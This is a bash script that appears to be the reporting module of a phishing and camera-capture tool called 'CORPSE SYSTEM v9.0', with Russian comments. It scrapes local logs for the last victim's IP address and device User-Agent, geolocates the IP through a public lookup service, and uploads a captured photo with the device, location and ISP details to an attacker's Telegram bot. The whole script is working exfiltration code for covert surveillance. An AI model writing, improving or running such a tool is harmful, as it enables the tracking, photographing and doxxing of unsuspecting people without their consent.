#!/bin/bash
source .tg_config
sleep 7

# 1. Тотальный поиск IP (проверяем все логи, кроме мусора)
IP=$(grep -rE -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" . --exclude-dir=".git" 2>/dev/null | grep -vE "8.8.8.8|127.0.0.1|0.0.0.0" | tail -n 1 | awk -F: '{print $NF}' | tr -d ' ')

# 2. Поиск устройства (User-Agent)
UA_RAW=$(grep -rEi "Android|iPhone|Windows|Linux" . --exclude-dir=".git" 2>/dev/null | tail -n 1)
DEVICE=$(echo "$UA_RAW" | grep -oP '\((.*?)\)' | head -n 1 | tr -d '()')

if [ -z "$DEVICE" ] || [[ "$DEVICE" == *"grep"* ]]; then
    DEVICE=$(echo "$UA_RAW" | grep -oEi "Android|iPhone|Windows|Linux" | head -n 1)
fi
[ -z "$DEVICE" ] && DEVICE="Android/iOS Device"

# 3. Данные по IP
if [ ! -z "$IP" ]; then
    INFO=$(curl -s "http://ip-api.com/json/$IP?fields=status,country,city,isp")
    LOC=$(echo $INFO | jq -r '"\(.country // "Неизвестно"), \(.city // "")"' | sed 's/, $//')
    NET=$(echo $INFO | jq -r '.isp // "Неизвестно"')
else
    IP="Не найден"; LOC="Ожидание клика..."; NET="---"
fi

CAPTION=$(echo -e "💀 *CORPSE SYSTEM v9.0* 📸\n\n📱 *Устройство:* $DEVICE\n📍 *Место:* $LOC\n🌐 *Сеть:* $NET\n🔗 *IP:* \`$IP\`\n\n✅ _Данные синхронизированы!_")

if [ -f "$1" ]; then
    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendPhoto" \
         -F "chat_id=$CHAT_ID" \
         -F "photo=@$1" \
         -F "caption=$CAPTION" \
         -F "parse_mode=Markdown" > /dev/null
fi
